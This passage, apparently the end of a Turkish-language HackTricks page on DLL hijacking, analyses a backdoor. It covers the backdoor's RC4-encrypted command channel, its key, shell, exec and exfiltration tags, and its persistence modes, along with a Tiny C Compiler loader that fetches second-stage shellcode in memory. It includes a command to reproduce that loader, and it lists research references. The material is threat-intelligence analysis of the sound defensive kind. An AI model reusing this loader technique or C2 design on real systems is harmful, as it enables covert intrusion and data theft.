- Beacons nokta ile ayrılmış bir host profili oluşturur, `4Q` tag'ini başa ekler, sonra HTTPS üzerinden `HttpSendRequestA` öncesinde key `vAuig34%^325hGV` ile RC4-encrypt eder. Yanıtlar RC4 ile decrypt edilir ve tag switch ile yönlendirilir (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer vakaları).
- Execution mode CLI arg'larıyla kontrol edilir: arg yok = persistence kur (service/Run key) `-i`'ye işaret eder; `-i` kendini `-k` ile yeniden başlatır; `-k` kurulumu atlar ve payload'u çalıştırır.

Alternate loader observed
- Aynı ihlal Tiny C Compiler bıraktı ve `C:\ProgramData\USOShared\`'ten `svchost.exe -nostdlib -run conf.c` komutunu çalıştırdı, yanında `libtcc.dll` vardı. Saldırgan tarafından sağlanan C kaynak kodu gömülü shellcode'u compile etti ve bir PE ile diske dokunmadan in-memory olarak çalıştırdı. Bunu şu şekilde çoğaltın:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Bu TCC-based compile-and-run aşaması çalışma zamanında `Wininet.dll`'i yükledi ve hardcoded URL'den second-stage shellcode çekti; compiler run gibi davranan esnek bir loader sağladı.

## Referanslar

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)


{{#include ../../../banners/hacktricks-training.md}}
